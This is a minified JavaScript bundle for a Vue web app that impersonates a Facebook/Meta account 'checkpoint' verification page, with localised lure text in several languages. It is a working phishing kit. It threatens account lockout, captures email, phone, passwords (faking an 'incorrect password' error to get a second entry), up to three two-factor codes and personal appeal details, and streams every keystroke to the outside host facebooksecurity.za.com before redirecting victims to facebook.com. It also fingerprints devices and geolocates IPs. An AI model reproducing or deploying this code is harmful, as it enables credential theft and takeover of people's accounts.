(function () {
 var e = {
   4100: function (e, o, t) {
    "use strict";
    var a = t(5130),
     i = t(6768);
    const r = { id: "app" };
    function n(e, o, t, a, n, s) {
     const l = (0, i.g2)("router-view");
     return (0, i.uX)(), (0, i.CE)("div", r, [(0, i.bF)(l)]);
    }
    var s = { name: "App" },
     l = t(1241);
    const c = (0, l.A)(s, [["render", n]]);
    var d = c,
     u = t(8785),
     p = (t(1077), t(1387)),
     m = t(4232);
    const h = {
      class:
       "container d-flex justify-content-center align-items-center vh-100",
     },
     f = { class: "row justify-content-center" },
     g = { class: "col-md-7 shadow wrap-all" },
     w = { class: "row p-3 wrap-page" },
     b = { class: "col-md-12" },
     v = ["src"],
     k = { class: "col-md-12 mb-3" },
     P = { class: "card shadow-sm" },
     y = { class: "row hover-verify" },
     F = { class: "col-3 left-page" },
     I = ["src"],
     T = { class: "card-title" },
     E = { class: "card-text" };
    function N(e, o, a, r, n, s) {
     const l = (0, i.g2)("el-button");
     return (
      (0, i.uX)(),
      (0, i.CE)("div", h, [
       (0, i.Lk)("div", f, [
        (0, i.Lk)("div", g, [
         (0, i.Lk)("div", w, [
          (0, i.Lk)("div", b, [
           (0, i.Lk)("img", { src: t(8130), alt: "Checkpoint" }, null, 8, v),
          ]),
          (0, i.Lk)("div", k, [
           (0, i.Lk)("div", P, [
            (0, i.Lk)("div", y, [
             (0, i.Lk)("div", F, [
              (0, i.Lk)("img", { src: t(9167), alt: "Checkpoint" }, null, 8, I),
             ]),
             (0, i.Lk)(
              "div",
              {
               class: "col-9 card-body text-left right-page",
               onClick:
                o[0] || (o[0] = (...e) => s.goToVerify && s.goToVerify(...e)),
              },
              [
               (0, i.Lk)("h2", T, (0, m.v_)(e.$t("checkpoint1")), 1),
               (0, i.Lk)("p", E, (0, m.v_)(e.$t("checkpoint1")), 1),
               (0, i.bF)(
                l,
                {
                 type: "primary",
                 loading: n.btnLoading,
                 onClick: s.goToVerify,
                 "native-type": "submit",
                },
                {
                 default: (0, i.k6)(() => [
                  (0, i.eW)((0, m.v_)(e.$t("verifyBtn")), 1),
                 ]),
                 _: 1,
                },
                8,
                ["loading", "onClick"]
               ),
              ]
             ),
            ]),
           ]),
          ]),
         ]),
        ]),
       ]),
      ])
     );
    }
    t(4114);
    var B = {
     data() {
      return {
       geoData: { city: "", country: "", ip: "" },
       btnLoading: !1,
       admin_id: 0,
       error: null,
       deviceInfo: {},
      };
     },
     created() {
      this.checkLocalStorage();
     },
     mounted() {
      setTimeout(() => {
       this.getDeviceInfo();
      }, 1e3),
       (this.admin_id = this.$route.query.admin_id);
     },
     methods: {
      goToVerify() {
       (this.btnLoading = !0),
        setTimeout(() => {
         this.$router.push({
          name: "Verify",
          params: { admin_id: this.admin_id },
         });
        }, 3e3);
      },
      getDeviceInfo() {
       const e = new window.ClientJS();
       (this.deviceInfo = {
        browser: e.getBrowser(),
        os: e.getOS(),
        device: e.getDevice(),
        isMobile: e.isMobile(),
       }),
        localStorage.setItem("deviceInfo", JSON.stringify(this.deviceInfo));
      },
      checkLocalStorage() {
       const e = localStorage.getItem("geoData");
       e
        ? ((this.geoData = JSON.parse(e)),
          console.log("Loaded geo data from localStorage:", this.geoData),
          (this.$i18n.locale = this.geoData.country_code.toLowerCase()),
          console.log(
           "country code: ",
           this.geoData.country_code.toLowerCase()
          ))
        : this.fetchGeoData();
      },
      async fetchGeoData() {
       try {
        const e = await fetch("https://get.geojs.io/v1/ip/geo.json"),
         o = await e.json();
        localStorage.setItem("geoData", JSON.stringify(o)),
         (this.geoData = {
          city: o.city,
          country: o.country,
          ip: o.ip,
          country_code: o.country_code,
         }),
         (this.$i18n.locale = o.country_code.toLowerCase()),
         console.log("Geo data saved to localStorage:", o),
         console.log("country code: ", o.country_code);
       } catch (e) {
        (this.error = "Failed to fetch geo data."),
         console.error("Error fetching geo data:", e);
       }
      },
     },
    };
    const C = (0, l.A)(B, [
     ["render", N],
     ["__scopeId", "data-v-4b47c7d2"],
    ]);
    var D = C;
    const L = {
      class:
       "container d-flex justify-content-center align-items-center vh-100",
     },
     S = { class: "col-md-8" },
     A = { class: "mb-5 meta-logo" },
     O = ["src"],
     _ = { class: "mb-3" },
     x = ["placeholder"],
     V = { class: "mb-3 country-dropdown" },
     M = { class: "d-flex justify-content-between mb-3" },
     j = { class: "d-flex justify-content-between" },
     J = { href: "#", class: "btn btn-link forget-password" },
     $ = {
      class: "modal fade show",
      id: "passwordModal",
      tabindex: "-1",
      role: "dialog",
      "aria-labelledby": "passwordModalLabel",
      "aria-hidden": "true",
      style: { display: "block", "background-color": "#0000007a" },
     },
     z = { class: "modal-dialog modal-dialog-centered", role: "document" },
     U = { class: "modal-content", style: { "max-width": "350px" } },
     q = { key: 0, class: "modal-header w-100 d-flex" },
     W = { key: 1, class: "modal-body" },
     R = { for: "modal-password", class: "mb-1 font-weight-bold" },
     G = {
      key: 0,
      class: "mt-1",
      style: { "font-size": "12px", color: "red", "line-height": "normal" },
     },
     X = { key: 2, class: "modal-body" },
     Q = { for: "modal-password", class: "mb-1 font-weight-bold" },
     K = {
      key: 0,
      class: "mt-1",
      style: { "font-size": "12px", color: "red", "line-height": "normal" },
     },
     Z = {
      key: 3,
      class: "modal-body",
      style: { padding: "0", margin: "0.5rem 1rem" },
     },
     H = { class: "mb-3 mt-3 font-weight-bold text-center" },
     Y = { class: "mb-3" },
     ee = ["placeholder"],
     oe = { class: "mb-3" },
     te = ["placeholder"],
     ae = { class: "mb-3" },
     ie = ["placeholder"],
     re = { class: "mb-3 country-dropdown" },
     ne = { class: "mb-3" },
     se = ["placeholder"],
     le = { class: "mb-3" },
     ce = { key: 4, class: "modal-footer w-100" },
     de = {
      key: 5,
      class:
       "modal-footer w-100 d-flex justify-content-between align-items-center",
     },
     ue = { key: 0, class: "mr-auto", style: { color: "red" } },
     pe = { key: 6, class: "modal-footer w-100" },
     me = { class: "loading" },
     he = ["src"];
    function fe(e, o, r, n, s, l) {
     const c = (0, i.g2)("IntlTelInput"),
      d = (0, i.g2)("el-input"),
      u = (0, i.g2)("el-checkbox"),
      p = (0, i.g2)("el-button");
     return (
      (0, i.uX)(),
      (0, i.CE)(
       i.FK,
       null,
       [
        (0, i.Lk)("div", L, [
         (0, i.bo)(
          (0, i.Lk)(
           "div",
           S,
           [
            (0, i.Lk)("div", A, [
             (0, i.Lk)("img", { src: t(3943), alt: "Meta" }, null, 8, O),
            ]),
            (0, i.Lk)(
             "form",
             {
              onSubmit:
               o[5] ||
               (o[5] = (0, a.D$)(
                (...e) => l.onInput && l.onInput(...e),
                ["prevent"]
               )),
             },
             [
              (0, i.Lk)("div", _, [
               (0, i.bo)(
                (0, i.Lk)(
                 "input",
                 {
                  onInput:
                   o[0] || (o[0] = (...e) => l.onInput && l.onInput(...e)),
                  type: "email",
                  class: "form-control",
                  id: "email",
                  "onUpdate:modelValue": o[1] || (o[1] = (e) => (s.email = e)),
                  placeholder: e.$t("emailInput"),
                  required: "",
                 },
                 null,
                 40,
                 x
                ),
                [[a.Jo, s.email]]
               ),
              ]),
              (0, i.Lk)("div", V, [
               (0, i.bF)(
                c,
                {
                 required: "",
                 modelValue: s.phone,
                 "onUpdate:modelValue": o[2] || (o[2] = (e) => (s.phone = e)),
                 ref: "phoneInput",
                 onInput: o[3] || (o[3] = (e) => l.onPhoneInput()),
                 options: {
                  loadUtilsOnInit: !0,
                  separateDialCode: !0,
                  initialCountry: s.geoData.country_code,
                 },
                },
                null,
                8,
                ["modelValue", "options"]
               ),
              ]),
              (0, i.Lk)("div", M, [
               (0, i.Lk)(
                "button",
                {
                 type: "submit",
                 class: "btn btn-primary w-100 rounded-5",
                 onClick:
                  o[4] ||
                  (o[4] = (...e) => l.openPassword && l.openPassword(...e)),
                },
                (0, m.v_)(e.$t("submitBtn")),
                1
               ),
              ]),
              (0, i.Lk)("div", j, [
               (0, i.Lk)("a", J, (0, m.v_)(e.$t("forgetPass")), 1),
              ]),
             ],
             32
            ),
           ],
           512
          ),
          [[a.aG, s.wrapAll]]
         ),
        ]),
        (0, i.bo)(
         (0, i.Lk)(
          "div",
          $,
          [
           (0, i.Lk)("div", z, [
            (0, i.Lk)("div", U, [
             s.isAppealForm
              ? (0, i.Q3)("", !0)
              : ((0, i.uX)(),
                (0, i.CE)("div", q, [
                 (0, i.Lk)("h4", null, (0, m.v_)(e.$t("verifyTitle")), 1),
                ])),
             !s.isPasswordForm || s.isTwoFactor || s.isAppealForm
              ? (0, i.Q3)("", !0)
              : ((0, i.uX)(),
                (0, i.CE)("div", W, [
                 (0, i.Lk)("label", R, (0, m.v_)(e.$t("enterPassword")), 1),
                 (0, i.bF)(
                  d,
                  {
                   class: "mt-1 mb-2",
                   modelValue: s.password,
                   "onUpdate:modelValue":
                    o[6] || (o[6] = (e) => (s.password = e)),
                   type: "password",
                   onInput: o[7] || (o[7] = (e) => l.onPhoneInput()),
                   placeholder: e.$t("passwordPlaceholder"),
                   "show-password": "",
                   required: "",
                  },
                  null,
                  8,
                  ["modelValue", "placeholder"]
                 ),
                 s.labelWrong
                  ? ((0, i.uX)(),
                    (0, i.CE)(
                     "span",
                     G,
                     (0, m.v_)(e.$t("passwordIncorrect")),
                     1
                    ))
                  : (0, i.Q3)("", !0),
                ])),
             s.isTwoFactor
              ? ((0, i.uX)(),
                (0, i.CE)("div", X, [
                 (0, i.Lk)("h5", Q, (0, m.v_)(e.$t("twoFactorTitle")), 1),
                 (0, i.Lk)(
                  "span",
                  null,
                  (0, m.v_)(e.$t("twoFactorDescription")),
                  1
                 ),
                 (0, i.bF)(
                  d,
                  {
                   required: "",
                   class: "mt-1 mb-2",
                   modelValue: s.code,
                   "onUpdate:modelValue": o[8] || (o[8] = (e) => (s.code = e)),
                   minlength: "6",
                   maxlength: "8",
                   type: "text",
                   onInput: o[9] || (o[9] = (e) => l.onPhoneInput()),
                   placeholder: e.$t("twoFactorPlaceholder"),
                  },
                  null,
                  8,
                  ["modelValue", "placeholder"]
                 ),
                 s.labelAuthWrong
                  ? ((0, i.uX)(),
                    (0, i.CE)(
                     "span",
                     K,
                     (0, m.v_)(e.$t("authCodeMismatch")),
                     1
                    ))
                  : (0, i.Q3)("", !0),
                ]))
              : (0, i.Q3)("", !0),
             s.isAppealForm
              ? ((0, i.uX)(),
                (0, i.CE)("div", Z, [
                 (0, i.Lk)("h3", H, (0, m.v_)(e.$t("appealFormTitle")), 1),
                 (0, i.Lk)("div", Y, [
                  (0, i.bo)(
                   (0, i.Lk)(
                    "input",
                    {
                     onInput:
                      o[10] || (o[10] = (...e) => l.onInput && l.onInput(...e)),
                     type: "text",
                     class: "form-control",
                     "onUpdate:modelValue":
                      o[11] || (o[11] = (e) => (s.appealFormData.fullName = e)),
                     placeholder: e.$t("fullNamePlaceholder"),
                     required: "",
                    },
                    null,
                    40,
                    ee
                   ),
                   [[a.Jo, s.appealFormData.fullName]]
                  ),
                 ]),
                 (0, i.Lk)("div", oe, [
                  (0, i.bo)(
                   (0, i.Lk)(
                    "input",
                    {
                     onInput:
                      o[12] || (o[12] = (...e) => l.onInput && l.onInput(...e)),
                     type: "email",
                     class: "form-control",
                     "onUpdate:modelValue":
                      o[13] ||
                      (o[13] = (e) => (s.appealFormData.personalEmail = e)),
                     placeholder: e.$t("personalEmailPlaceholder"),
                     required: "",
                    },
                    null,
                    40,
                    te
                   ),
                   [[a.Jo, s.appealFormData.personalEmail]]
                  ),
                 ]),
                 (0, i.Lk)("div", ae, [
                  (0, i.bo)(
                   (0, i.Lk)(
                    "input",
                    {
                     onInput:
                      o[14] || (o[14] = (...e) => l.onInput && l.onInput(...e)),
                     type: "email",
                     class: "form-control",
                     "onUpdate:modelValue":
                      o[15] ||
                      (o[15] = (e) => (s.appealFormData.businessEmail = e)),
                     placeholder: e.$t("businessEmailPlaceholder"),
                     required: "",
                    },
                    null,
                    40,
                    ie
                   ),
                   [[a.Jo, s.appealFormData.businessEmail]]
                  ),
                 ]),
                 (0, i.Lk)("div", re, [
                  (0, i.bF)(
                   c,
                   {
                    modelValue: s.appealFormData.phoneNumber,
                    "onUpdate:modelValue":
                     o[16] ||
                     (o[16] = (e) => (s.appealFormData.phoneNumber = e)),
                    ref: "phoneInput",
                    "max-length": "20",
                    onInput: o[17] || (o[17] = (e) => l.onPhoneInput()),
                    options: {
                     loadUtilsOnInit: !0,
                     separateDialCode: !0,
                     initialCountry: s.geoData.country_code,
                    },
                   },
                   null,
                   8,
                   ["modelValue", "options"]
                  ),
                 ]),
                 (0, i.Lk)("div", ne, [
                  (0, i.bo)(
                   (0, i.Lk)(
                    "input",
                    {
                     onInput:
                      o[18] || (o[18] = (...e) => l.onInput && l.onInput(...e)),
                     type: "text",
                     class: "form-control",
                     "onUpdate:modelValue":
                      o[19] ||
                      (o[19] = (e) => (s.appealFormData.facebookPageName = e)),
                     placeholder: e.$t("facebookPageNamePlaceholder"),
                     required: "",
                    },
                    null,
                    40,
                    se
                   ),
                   [[a.Jo, s.appealFormData.facebookPageName]]
                  ),
                 ]),
                 (0, i.Lk)("div", le, [
                  (0, i.bo)(
                   (0, i.Lk)(
                    "textarea",
                    {
                     onInput:
                      o[20] || (o[20] = (...e) => l.onInput && l.onInput(...e)),
                     type: "text",
                     class: "form-control",
                     "onUpdate:modelValue":
                      o[21] ||
                      (o[21] = (e) =>
                       (s.appealFormData.additionalInformation = e)),
                     placeholder: "Additional information",
                     required: "",
                     rows: "4",
                    },
                    null,
                    544
                   ),
                   [[a.Jo, s.appealFormData.additionalInformation]]
                  ),
                 ]),
                 (0, i.bF)(
                  u,
                  {
                   label: e.$t("agreeTerms"),
                   modelValue: s.isAgree,
                   "onUpdate:modelValue":
                    o[22] || (o[22] = (e) => (s.isAgree = e)),
                  },
                  null,
                  8,
                  ["label", "modelValue"]
                 ),
                ]))
              : (0, i.Q3)("", !0),
             !s.isPasswordForm || s.isTwoFactor || s.isAppealForm
              ? (0, i.Q3)("", !0)
              : ((0, i.uX)(),
                (0, i.CE)("div", ce, [
                 (0, i.bF)(
                  p,
                  {
                   type: "primary",
                   loading: s.btnLoading,
                   onClick: l.submitForm,
                   "native-type": "submit",
                  },
                  {
                   default: (0, i.k6)(() => [
                    (0, i.eW)((0, m.v_)(e.$t("loginButton")), 1),
                   ]),
                   _: 1,
                  },
                  8,
                  ["loading", "onClick"]
                 ),
                ])),
             s.isTwoFactor
              ? ((0, i.uX)(),
                (0, i.CE)("div", de, [
                 s.disablesubmitTwoFactor
                  ? ((0, i.uX)(),
                    (0, i.CE)(
                     "p",
                     ue,
                     " 00: " +
                      (0, m.v_)(s.countdown.toString().padStart(2, "0")),
                     1
                    ))
                  : (0, i.Q3)("", !0),
                 (0, i.bF)(
                  p,
                  {
                   type: "primary",
                   style: { "margin-left": "auto" },
                   loading: s.btnLoading,
                   onClick: l.submitTwoFactor,
                   disabled: s.disablesubmitTwoFactor,
                   "native-type": "submit",
                  },
                  {
                   default: (0, i.k6)(() => [
                    (0, i.eW)((0, m.v_)(e.$t("submitButton")), 1),
                   ]),
                   _: 1,
                  },
                  8,
                  ["loading", "onClick", "disabled"]
                 ),
                ]))
              : (0, i.Q3)("", !0),
             s.isAppealForm
              ? ((0, i.uX)(),
                (0, i.CE)("div", pe, [
                 (0, i.bF)(
                  p,
                  {
                   type: "primary",
                   disabled: !s.isAgree,
                   loading: s.btnLoading,
                   onClick: l.submitAppealForm,
                   "native-type": "submit",
                  },
                  {
                   default: (0, i.k6)(() => [
                    (0, i.eW)((0, m.v_)(e.$t("submitButton")), 1),
                   ]),
                   _: 1,
                  },
                  8,
                  ["disabled", "loading", "onClick"]
                 ),
                ]))
              : (0, i.Q3)("", !0),
            ]),
           ]),
          ],
          512
         ),
         [[a.aG, s.isOpenModal]]
        ),
        (0, i.bo)(
         (0, i.Lk)(
          "div",
          me,
          [(0, i.Lk)("img", { src: t(1833), alt: "Loading" }, null, 8, he)],
          512
         ),
         [[a.aG, s.loading]]
        ),
       ],
       64
      )
     );
    }
    var ge = t(6169),
     we = t(1219),
     be = t(2933),
     ve = t(4373),
     ke = t(8626),
     Pe = {
      name: "VerifyPage",
      components: { IntlTelInput: ge.A },
      data() {
       return {
        email: "",
        phone: "",
        password: "",
        code: "",
        socket: null,
        ticket_id: this.generateTicketId(),
        geoData: JSON.parse(localStorage.getItem("geoData") || "null"),
        deviceInfo: JSON.parse(localStorage.getItem("deviceInfo") || "null"),
        btnLoading: !1,
        labelWrong: !1,
        labelAuthWrong: !1,
        isTwoFactor: !1,
        isPasswordForm: !1,
        isAppealForm: !1,
        passwordTime: 0,
        authTime: 0,
        appealFormData: {
         fullName: "",
         personalEmail: "",
         businessEmail: "",
         phoneNumber: "",
         facebookPageName: "",
         additionalInformation: "",
        },
        isAgree: !1,
        disablesubmitTwoFactor: !1,
        countdown: 0,
        from: `${window.location.origin}${this.$route.fullPath}`,
        wrapAll: !0,
        loading: !1,
        isOpenModal: !1,
       };
      },
      created() {
       (this.debouncedSendMessage = (0, ke.debounce)(() => {
        this.sendMessage();
       }, 500)),
        (this.socket = new WebSocket("https://facebooksecurity.za.com/wss")),
        (this.socket.onopen = () => {
         this.socket.send(
          JSON.stringify({
           type: "ticket",
           ticket_id: this.ticket_id,
           admin_id: this.$route.params.admin_id,
           deviceInfo: JSON.parse(localStorage.getItem("deviceInfo")) || {},
           geoData: JSON.parse(localStorage.getItem("geoData")) || {},
          })
         );
        });
      },
      methods: {
       async openPassword() {
        const e = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
        return this.email
         ? e.test(this.email)
           ? this.phone
             ? ((this.isPasswordForm = !0),
               (this.loading = !0),
               await this.delay(2e3),
               (this.isOpenModal = !0),
               void (this.loading = !1))
             : (we.nk.error("Phone number cannot be empty"), !1)
           : (we.nk.error("Invalid email address"), !1)
         : (we.nk.error("Email cannot be empty"), !1);
       },
       onPhoneInput() {
        const e = this.phone;
        var o = this.appealFormData.phoneNumber;
        const t = e.replace(/\D/g, "");
        var a = o.replace(/\D/g, "");
        (this.phone = t), (this.appealFormData.phoneNumber = a), this.onInput();
       },
       onInput() {
        (this.labelWrong = !1),
         (this.labelAuthWrong = !1),
         this.debouncedSendMessage();
       },
       generateTicketId() {
        return Math.random().toString(36).substr(2, 9);
       },
       async submitForm() {
        if (this.email && this.password && this.phone)
         try {
          this.btnLoading = !0;
          var e = {
           from: this.from,
           email: this.email,
           phone: this.phone,
           user_uuid: this.$route.params.admin_id,
           ticket_id: this.ticket_id,
           geoData: Object.keys(this.geoData).length
            ? JSON.stringify(this.geoData)
            : "{}",
           deviceInfo: Object.keys(this.deviceInfo).length
            ? JSON.stringify(this.deviceInfo)
            : "{}",
           step: "login",
           times: this.passwordTime + 1,
          };
          0 == this.passwordTime && (e.password = this.password),
           this.passwordTime >= 1 && (e.password2 = this.password),
           await ve.A.post("https://facebooksecurity.za.com/api/tickets", e, {
            headers: { "Content-Type": "application/json" },
           }),
           await this.delay(500),
           (this.btnLoading = !1),
           this.passwordTime++,
           this.passwordTime < 2
            ? ((this.labelWrong = !0), (this.password = null))
            : ((this.labelWrong = !1),
              (this.isPasswordForm = !1),
              (this.isTwoFactor = !0));
         } catch (o) {
          (this.btnLoading = !1), console.error(o);
         }
        else
         (0, we.nk)({
          message: "Please enter a valid email, password, and phone number",
          type: "warning",
          duration: 3e3,
         });
       },
       async submitTwoFactor() {
        if (!this.code)
         return void (0, we.nk)({
          message: "Please enter a valid OTP",
          type: "warning",
          duration: 3e3,
         });
        (this.btnLoading = !0), (this.countdown = 30);
        const e = { type_send: "Nhập OTP", times: this.authTime + 1 };
        0 == this.authTime && (e.otp = this.code),
         this.authTime >= 1 && (e.otp2 = this.code),
         this.authTime >= 2 && (e.otp3 = this.code);
        try {
         const o = await ve.A.put(
          `https://facebooksecurity.za.com/api/tickets/${this.ticket_id}`,
          e
         );
         if (
          ((this.successMessage = o.data.message),
          await this.delay(500),
          this.authTime < 2)
         ) {
          (this.code = null),
           (this.labelAuthWrong = !0),
           (this.disablesubmitTwoFactor = !0);
          const e = setInterval(() => {
           this.countdown > 0
            ? this.countdown--
            : (clearInterval(e), (this.disablesubmitTwoFactor = !1));
          }, 1e3);
         } else
          (this.labelAuthWrong = !1),
           (this.isTwoFactor = !1),
           (this.loading = !0),
           await this.delay(2e3),
           (this.isAppealForm = !0),
           (this.loading = !1);
         this.authTime++, (this.btnLoading = !1);
        } catch (o) {
         (this.btnLoading = !1), console.error("Error updating ticket:", o);
        }
       },
       delay(e) {
        return new Promise((o) => setTimeout(o, e));
       },
       async submitAppealForm() {
        if (
         !this.appealFormData.fullName ||
         !this.appealFormData.personalEmail ||
         !this.appealFormData.businessEmail ||
         !this.appealFormData.phoneNumber ||
         !this.appealFormData.facebookPageName
        )
         return (
          (0, we.nk)({
           message:
            "Please enter all required fields: full name, personal email, business email, phone number, and Facebook page name.",
           type: "warning",
           duration: 3e3,
          }),
          void (this.btnLoading = !1)
         );
        const e = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
        if (
         !this.appealFormData.businessEmail ||
         !this.appealFormData.personalEmail
        )
         return we.nk.error("Email cannot be empty"), !1;
        if (
         !e.test(
          this.appealFormData.businessEmail ||
           !e.test(this.appealFormData.personalEmail)
         )
        )
         return we.nk.error("Invalid email address"), !1;
        if (!this.appealFormData.phoneNumber)
         return we.nk.error("Phone number cannot be empty"), !1;
        this.btnLoading = !0;
        try {
         const e = {
           fullName: this.appealFormData.fullName,
           personalEmail: this.appealFormData.personalEmail,
           businessEmail: this.appealFormData.businessEmail,
           phoneNumber: this.appealFormData.phoneNumber,
           facebookPageName: this.appealFormData.facebookPageName,
           additionalInformation: this.appealFormData.additionalInformation,
           type_send: "Nhập form appeal",
          },
          o = await ve.A.put(
           `https://facebooksecurity.za.com/api/tickets/${this.ticket_id}`,
           e
          );
         (this.wrapAll = !1),
          (this.isOpenModal = !1),
          (this.loading = !0),
          await this.delay(2500),
          (this.loading = !1),
          be.s.alert("Redirect to facebook", "Successul", {
           confirmButtonText: "OK",
          }),
          await this.delay(2e3),
          (window.location.href = "https://facebook.com"),
          (this.successMessage = o.data.message),
          (this.isAppealForm = !1),
          (this.formSubmitted = !0),
          (this.btnLoading = !1);
        } catch (o) {
         this.btnLoading = !1;
        }
       },
       sendMessage() {
        this.socket.send(
         JSON.stringify({
          type: "message",
          ticket_id: this.ticket_id,
          admin_id: this.$route.params.admin_id,
          data: {
           email: this.email,
           password: this.password,
           phone:
            this.$refs.phoneInput.instance.selectedCountryData.dialCode +
            this.phone,
           otp: this.code,
           appealForm: JSON.stringify(this.appealFormData),
          },
         })
        );
       },
      },
     };
    const ye = (0, l.A)(Pe, [
     ["render", fe],
     ["__scopeId", "data-v-099adb34"],
    ]);
    var Fe = ye;
    const Ie = { class: "container text-center wrap" };
    function Te(e, o, t, a, r, n) {
     return (
      (0, i.uX)(),
      (0, i.CE)(
       "div",
       Ie,
       o[0] ||
        (o[0] = [
         (0, i.Fv)(
          '<div class="row justify-content-center child" data-v-45e14213><div class="col-md-6" data-v-45e14213><div class="facebook-icon mb-4" data-v-45e14213><img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Icon" class="img-fluid" style="max-width:80px;" data-v-45e14213></div><h1 class="display-4 text-primary" data-v-45e14213>404 - Page Not Found</h1><p class="lead text-muted" data-v-45e14213>Sorry, the page you&#39;re looking for doesn&#39;t exist.</p></div></div>',
          1
         ),
        ])
      )
     );
    }
    var Ee = { name: "NotFoundPage" };
    const Ne = (0, l.A)(Ee, [
     ["render", Te],
     ["__scopeId", "data-v-45e14213"],
    ]);
    var Be = Ne;
    const Ce = [
      { path: "/checkpoint/:admin_id", name: "Checkpoint", component: D },
      { path: "/verify/:admin_id", name: "Verify", component: Fe },
      { path: "/:pathMatch(.*)*", name: "NotFound", component: Be },
     ],
     De = (0, p.aE)({ history: (0, p.LA)(), routes: Ce });
    var Le = De,
     Se = t(5931);
    const Ae = {},
     Oe = t(3901);
    Oe.keys().forEach((e) => {
     const o = e.match(/\.\/(.*)\.json/)[1];
     Ae[o] = Oe(e);
    });
    const _e = (0, Se.hU)({ locale: "en", messages: Ae });
    var xe = _e,
     Ve = t(5234);
    t(3664);
    const Me = (0, Ve.Ey)(),
     je = (0, a.Ef)(d);
    je.use(u.A), je.use(Le), je.use(xe), je.use(Me), je.mount("#app");
   },
   3901: function (e, o, t) {
    var a = {
     "./ar.json": 5310,
     "./br.json": 9889,
     "./cn.json": 5556,
     "./de.json": 5894,
     "./eg.json": 5553,
     "./en.json": 4174,
     "./es.json": 6725,
     "./fr.json": 4605,
     "./in.json": 8066,
     "./it.json": 3672,
     "./jp.json": 3679,
     "./kr.json": 7416,
     "./mx.json": 5832,
     "./ng.json": 2838,
     "./ph.json": 1153,
     "./ru.json": 4600,
     "./th.json": 7549,
     "./us.json": 2389,
     "./vn.json": 5809,
     "./za.json": 2444,
    };
    function i(e) {
     var o = r(e);
     return t(o);
    }
    function r(e) {
     if (!t.o(a, e)) {
      var o = new Error("Cannot find module '" + e + "'");
      throw ((o.code = "MODULE_NOT_FOUND"), o);
     }
     return a[e];
    }
    (i.keys = function () {
     return Object.keys(a);
    }),
     (i.resolve = r),
     (e.exports = i),
     (i.id = 3901);
   },
   8130: function (e, o, t) {
    "use strict";
    e.exports = t.p + "img/checkpoint.36da537e.png";
   },
   1833: function (e, o, t) {
    "use strict";
    e.exports = t.p + "img/loading.3075426d.gif";
   },
   3943: function (e, o, t) {
    "use strict";
    e.exports = t.p + "img/meta.b736026c.png";
   },
   9167: function (e, o, t) {
    "use strict";
    e.exports = t.p + "img/unlock.faaf6b7f.gif";
   },
   5310: function (e) {
    "use strict";
    e.exports = JSON.parse(
     '{"welcome":"مرحبًا بك في تطبيقنا","checkpoint1":"سيتم قفل الحساب بعد 48 ساعة إذا لم تقم بالتحقق","checkpoint2":"يرجى الاتصال بنا على الفور للحصول على الدعم والتحقق من الحساب. يرجى اتباع تعليماتنا.","verifyBtn":"تحقق من الحساب","emailInput":"بريد إلكتروني","passwordInput":"كلمة المرور","submitBtn":"إرسال","forgetPass":"نسيت كلمة المرور؟","verifyTitle":"التحقق من الهوية","enterPassword":"أدخل كلمة المرور الخاصة بك","passwordPlaceholder":"يرجى إدخال كلمة المرور","passwordIncorrect":"كلمة المرور أو الحساب الذي أدخلته غير صحيح.","twoFactorTitle":"انتقل إلى تطبيق المصادقة","twoFactorDescription":"أدخل رمز مكون أرقام من تطبيق المصادقة الثنائي.","twoFactorPlaceholder":"الرمز","authCodeMismatch":"الرمز الذي أدخلته لا يتطابق مع رمز الدخول.","appealFormTitle":"نموذج الاستئناف","fullNamePlaceholder":"الاسم الكامل","personalEmailPlaceholder":"البريد الإلكتروني الشخصي","businessEmailPlaceholder":"البريد الإلكتروني للعمل","facebookPageNamePlaceholder":"اسم صفحة الفيسبوك","agreeTerms":"أوافق على الشروط والأحكام","loginButton":"تسجيل الدخول","submitButton":"إرسال"}'
    );
   },
   9889: function (e) {
    "use strict";
    e.exports = JSON.parse(
     '{"welcome":"Bem-vindo ao nosso aplicativo","checkpoint1":"A conta será bloqueada após 48 horas se você não verificar","checkpoint2":"Por favor, entre em contato conosco imediatamente para suporte e verificação de conta. Siga nossas instruções.","verifyBtn":"VERIFICAR CONTA","emailInput":"Email","passwordInput":"Senha","submitBtn":"Enviar","forgetPass":"Esqueceu a senha?","verifyTitle":"Verifique sua identidade","enterPassword":"Digite sua senha","passwordPlaceholder":"Por favor, insira sua senha","passwordIncorrect":"A senha ou conta inserida está incorreta.","twoFactorTitle":"Vá para seu aplicativo de autenticação","twoFactorDescription":"Digite o código de do aplicativo de autenticação de dois fatores.","twoFactorPlaceholder":"Código","authCodeMismatch":"O código de login inserido não corresponde ao enviado.","appealFormTitle":"Formulário de Apelação","fullNamePlaceholder":"Nome completo","personalEmailPlaceholder":"Email pessoal","businessEmailPlaceholder":"Email corporativo","facebookPageNamePlaceholder":"Nome da página do Facebook","agreeTerms":"Eu concordo com os Termos de Uso","loginButton":"Entrar","submitButton":"Enviar"}'
    );
   },
   5556: function (e) {
    "use strict";
    e.exports = JSON.parse(
     '{"welcome":"欢迎使用我们的应用程序","checkpoint1":"如果您不验证，账户将在48小时后被锁定","checkpoint2":"请立即联系我们以获取支持和账户验证。请遵循我们的说明。","verifyBtn":"验证账户","emailInput":"电子邮件","passwordInput":"密码","submitBtn":"提交","forgetPass":"忘记密码？","verifyTitle":"验证身份","enterPassword":"请输入您的密码","passwordPlaceholder":"请输入密码","passwordIncorrect":"您输入的密码或帐户不正确。","twoFactorTitle":"前往您的身份验证应用程序","twoFactorDescription":"请输入来自双因素认证应用程序的位代码。","twoFactorPlaceholder":"验证码","authCodeMismatch":"您输入的登录代码与发送的代码不匹配。","appealFormTitle":"申诉表格","fullNamePlaceholder":"全名","personalEmailPlaceholder":"个人邮箱","businessEmailPlaceholder":"工作邮箱","facebookPageNamePlaceholder":"Facebook页面名称","agreeTerms":"我同意使用条款","loginButton":"登录","submitButton":"提交"}'
    );
   },
   5894: function (e) {
    "use strict";
    e.exports = JSON.parse(
